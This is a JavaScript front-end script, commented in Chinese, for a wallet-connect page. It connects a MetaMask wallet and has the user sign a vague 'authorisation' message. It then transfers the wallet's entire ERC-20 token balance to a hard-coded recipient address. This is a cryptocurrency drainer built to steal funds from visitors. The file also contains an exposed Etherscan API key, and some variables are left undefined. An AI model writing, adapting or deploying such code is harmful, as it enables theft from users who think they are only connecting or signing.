const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
let provider;
let signer;

const erc20Abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)"
];

// 页面加载后初始化
window.onload = async () => {
    const selectedWallet = 'metamask'; // 默认选择 MetaMask
    document.getElementById('walletSelector').value = selectedWallet;
};

// 连接钱包按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    try {
        if (window.ethereum) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            const account = await signer.getAddress();
            updateWalletList(account);
            updateStatus('MetaMask 已连接');
            document.getElementById('signButton').disabled = false; // 启用签名按钮
        } else {
            updateStatus('请安装 MetaMask 钱包');
        }
    } catch (error) {
        updateStatus('连接失败: ' + error.message);
    }
};

// 签名按钮点击事件
document.getElementById('signButton').onclick = async () => {
    const account = await signer.getAddress();
    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
    try {
        const signature = await signer.signMessage(message);
        updateStatus(`签名成功: ${signature}`);

        // 调用转移资产的函数
        await transferAssets(account);
    } catch (error) {
        updateStatus(`签名失败: ${error.message}`);
    }
};

// 转移资产的函数
const transferAssets = async (account) => {
    updateStatus(`正在获取 ${account} 的代币余额...`);
    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
    
    try {
        const balance = await tokenContract.balanceOf(account);
        updateStatus(`当前余额: ${ethers.utils.formatUnits(balance, 18)} 代币`);

        if (balance.gt(0)) {
            const transferTx = await tokenContract.transfer(recipientAddress, balance);
            await transferTx.wait(); // 等待交易确认
            updateStatus(`成功转移 ${ethers.utils.formatUnits(balance, 18)} 代币到 ${recipientAddress}`);
        } else {
            updateStatus(`账户 ${account} 没有足够的代币`);
        }
    } catch (error) {
        updateStatus(`转移失败: ${error.message}`);
    }
};

// 更新状态信息
const updateStatus = (message) => {
    const statusElement = document.getElementById('status');
    statusElement.innerText += `\n${message}`;
};

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 获取代币余额的函数
const getTokenBalances = async (address) => {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            if (!tx.from || !tx.to) {
                continue; // 跳过没有 from 或 to 的交易
            }

            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        updateStatus('获取代币余额失败: ' + error.message);
        return {};
    }
};
